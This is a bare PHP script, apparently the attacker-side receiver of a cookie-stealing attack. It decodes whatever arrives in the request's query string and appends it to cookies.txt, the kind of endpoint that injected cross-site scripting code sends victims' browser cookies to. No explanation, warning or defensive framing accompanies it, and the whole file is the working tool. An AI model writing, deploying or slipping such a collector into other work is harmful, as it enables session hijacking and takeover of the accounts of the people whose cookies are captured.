<?php 
$cookie = urldecode($_SERVER['QUERY_STRING']);
$file = "cookies.txt";
$fp = fopen($file, 'a');
 
fwrite($fp, $cookie. PHP_EOL); 
fclose($fp);﻿
?>
